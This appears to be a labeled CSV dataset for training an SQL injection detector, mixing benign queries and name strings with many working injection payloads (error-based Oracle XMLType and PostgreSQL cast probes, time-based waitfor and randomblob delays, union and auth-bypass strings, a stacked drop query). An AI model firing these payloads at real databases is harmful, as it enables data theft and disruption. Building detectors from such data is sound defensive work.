payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"SELECT brave,package,these,raw,result ( ( large JOIN also ON way.collect = wall.difficult ) INNER JOIN proudON Orders.farm = pipe.certainlyID )","select __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ( ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ ) inner join __IDENT__ __IDENT__ = __IDENT__ )",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" or username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg""",select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ = __STR__ or __IDENT__ = __STR__,error_based,postgresql,0.9,True,original,silver
SELECT AVG ( second ) FROM hill SELECT SUM ( brother ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
( SELECT ProductID FROM OrderDetails WHERE Quantity > 1000 ) ;,( select __IDENT__ from __IDENT__ where __IDENT__ > __INT__ ) ;,benign,mysql,0.9,False,original,silver
1'|| ( select 'nwve' where 7721 = 7721,__INT__ __STR__ __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.7,True,original,bronze
SELECT day ( s ) FROM exchange,select __IDENT__ ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"1"" ) as ifgl where 2190 = 2190 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",__INT__ ) as __IDENT__ where __INT__ = __INT__ __IDENT__ ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __HEX__ end ) ) - -,boolean_blind,generic,0.5,True,original,bronze
1 ) and ( 2342 = 3620 ) *3620,__INT__ ) and ( __INT__ = __INT__ ) * __INT__,boolean_blind,generic,0.5,True,original,bronze
1 ) where 5651 = 5651,__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
lozier,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT * FROM strong ORDER BY said ASC, yard DESC","select * from __IDENT__ order by __IDENT__ asc , __IDENT__ desc",benign,generic,1.0,False,original,gold
nela,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-1641\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\' ) ) or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),error_based,oracle,0.9,True,original,silver
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","' and __IDENT__ ( __INT__ , concat ( __HEX__ , ( select version ( ) ) ) ) - -",error_based,mysql,0.9,True,original,silver
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'fwok' like 'fwok","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ and ( __STR__ like __IDENT__",heavy_query,db2,0.7,True,original,bronze
"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 where 5161 = 5161",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __INT__ where __INT__ = __INT__,error_based,oracle,0.75,True,original,bronze
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and \'foju\' = \'foju"" or username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1%\' and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__,error_based,oracle,0.85,True,original,silver
SELECT COUNT ( beside ) FROM lungs,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,postgresql,0.9,True,original,silver
mndez testua,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1 ) ) and ( ( 9452 = 9452""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,auth_bypass,generic,0.6,True,original,bronze
azorin 35 1b,__IDENT__ __INT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'enfe\' like \'enfe"" and username = ""1\' ) ) as plbt where 4368 = 4368",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True,original,silver
"1"" ) where 1833 = 1833",__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT force, game, island FROM helpful WHERE pine IS NULL","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ is null",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""-1254"" and username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __INT__,boolean_blind,oracle,0.8,True,original,silver
"INSERT INTO thy ( open, even, stand ) VALUES ( 'today', 'connected', 'above' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
"SELECT list, mine+ ', ' + coming+ ' ' + closer+ ', ' + fence AS happy FROM tales","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
bascuana de san pedro,__IDENT__ __IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
mendie,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy"" and username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1"" or username = ""1\' where 8537 = 8537 and username = ""1"" or username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
"SELECT tomorrow, speak, plastic FROM particular WHERE upper IS NULL","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where upper is null",benign,generic,1.0,False,original,gold
1 waitfor delay '0:0:5',__INT__ waitfor delay __STR__,time_blind,mssql,0.9,True,original,silver
"select * from users WHERE username = ""-1254"" or username = ""1\' ) as pogx where 4105 = 4105 and username = ""1"" and username = ""1%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__ __STR__ __INT__ % __STR__,error_based,oracle,0.95,True,original,gold
SELECT friend ( s FROM month RIGHT JOIN,select __IDENT__ ( __IDENT__ from __IDENT__ right join,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or username = ""1"" and \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__,auth_bypass,generic,0.6,True,original,bronze
"select * from users WHERE username = ""-7072\' ) and username = ""-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,union_based,oracle,0.95,True,original,gold
"prat de llobregat, el","__IDENT__ __IDENT__ __IDENT__ , __IDENT__",benign,generic,0.9,False,original,silver
ojeda fita,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--","select * from __IDENT__ ( __INT__ , __INT__ , case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) limit __INT__ - -",heavy_query,postgresql,0.9,True,original,silver
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1"" and username = ""1"" or 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __INT__ __STR__,error_based,oracle,0.9,True,original,silver
"select * from users WHERE username = ""-7874 ) ) ) and username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' )",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( ( __INT__ = __INT__ __STR__ - __INT__ __STR__ ),error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__,error_based,oracle,0.85,True,original,silver
if ( 3831 = 9321 ) select 3831 else drop function ybru--,if ( __INT__ = __INT__ ) select __INT__ else drop __IDENT__ __IDENT__ - -,stacked_queries,mysql,0.9,True,original,silver
SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False,original,gold
"1"" ) )",__INT__ ) ),unknown,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1 or username = ""-5880\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'rwgl\' = \'rwgl""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mssql,0.8,True,original,silver
mangot barra,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
SELECT COUNT ( worryID ) FROM dog,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT * FROM users WHERE username = ""-1157 ) ) as sxie where 7118 = 7118 AND username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) """,error_based,oracle,0.95,True,original,gold
"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --","__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' and username = ""1%\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,oracle,0.9,True,original,silver
SELECT * FROM crack,select * from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"SELECT * FROM bite WHERE weigh NOT IN ( 'drive', 'avoid', 'free' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
"1"" ) where 3958 = 3958 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","__INT__ ) where __INT__ = __INT__ or __INT__ = like ( __STR__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) - -",time_blind,sqlite,0.7,True,original,bronze
SELECT AVG ( Price ) FROM silk,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'ckfn' like 'ckfn",__INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,sqlite,0.7,True,original,bronze
"select * from users WHERE username = ""1\'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" or username = ""1\' ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ),out_of_band,oracle,0.9,True,original,silver
sort,__IDENT__,benign,generic,0.9,False,original,silver
"1' ) ) ) union all select null,null,null#","__INT__ ) ) ) union all select null , null , null",union_based,generic,0.85,True,original,silver
"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
SELECT rose FROM muscle UNION SELECT tiny FROM our ORDER BY helpful,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
SELECT continent ( s ) FROM ice INNER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ inner join,benign,generic,1.0,False,original,gold
c6he5era,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
